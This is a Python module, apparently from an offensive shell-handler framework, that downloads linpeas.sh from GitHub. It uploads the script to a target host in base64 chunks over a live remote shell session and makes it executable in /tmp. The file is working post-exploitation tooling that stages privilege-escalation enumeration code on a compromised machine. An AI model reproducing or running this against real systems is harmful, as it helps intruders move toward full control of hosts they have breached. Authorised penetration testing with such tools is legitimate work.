from __future__ import annotations

import base64
import time
import urllib.request

from koi.modules.blueprint import KoiModule

_LINPEAS_URL = (
    "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
)


class UploadLinpeas(KoiModule):
    name = "linpeas_upload"
    description = "Upload linpeas.sh to the target via base64 chunks."
    usage = "linpeas_upload <id> [-p <path>] [-d <delay>] [-c <chunk_size>]"
    arguments = [
        {"flags": ["-p", "--path"],  "default": "/tmp",  "help": "Remote directory"},
        {"flags": ["-d", "--delay"], "default": 0.05, "type": float, "help": "Delay between chunks"},
        {"flags": ["-c", "--chunk"], "default": 4096, "type": int, "help": "Chunk size in bytes"},
    ]

    def run(self) -> None:
        remote_path = f"{self.args.path}/linpeas.sh"
        delay = self.args.delay
        chunk_size = self.args.chunk
        
        self.status(f"Uploading to {remote_path}")
        self.status(f"Delay set to {delay:.2f} seconds")
        self.status(f"Chunk size set to {chunk_size} bytes")

        # 1. Download linpeas locally
        self.status(f"Downloading linpeas.sh from GitHub…")
        try:
            with self.spinner("Downloading…"):
                req = urllib.request.Request(
                    _LINPEAS_URL,
                    headers={"User-Agent": "Mozilla/5.0"},
                )
                with urllib.request.urlopen(req, timeout=30) as resp:
                    raw = resp.read()
        except Exception as exc:
            self.err(f"Download failed: {exc}")
            return

        size_kb = len(raw) / 1024
        self.ok(f"Downloaded {size_kb:.1f} KB")

        # 2. Encode to base64 and split into chunks
        b64 = base64.b64encode(raw).decode("ascii")
        chunks = [b64[i : i + chunk_size ] for i in range(0, len(b64), chunk_size )]
        total  = len(chunks)
        self.status(f"Splitting into {total} chunks of ~{chunk_size  // 1024}KB…")

        # 3. Initialise remote file
        if not self.sendline(f"printf '' > {remote_path}"):
            self.err("Session appears to be dead.")
            return
        time.sleep(0.15)

        # 4. Send each chunk
        self.status("Uploading…")
        try:
            for i, chunk in enumerate(chunks, start=1):
                result = self.exec(f"printf '%s' '{chunk}' | base64 -d >> {remote_path}", timeout=10)
                if not result.success:
                    self.err(f"Chunk {i}/{total} failed (rc={result.returncode})")
                    return

                pct = int(i / total * 100)
                bar = ("█" * (pct // 5)).ljust(20)
                self.ui.print_status_line(
                    f"  [{bar}] {pct:3d}%  chunk {i}/{total}"
                )
                time.sleep(delay)

        except KeyboardInterrupt:
            print()
            self.warn("Upload interrupted by user.")
            return

        self.sendline("sync")
        time.sleep(0.3)

        print()

        # 5. Make it executable
        self.sendline(f"chmod +x {remote_path}")
        time.sleep(0.1)

        self.box("Upload complete", {
            "local size":  f"{len(raw)} bytes  ({size_kb:.1f} KB)",
            "remote path": remote_path,
        })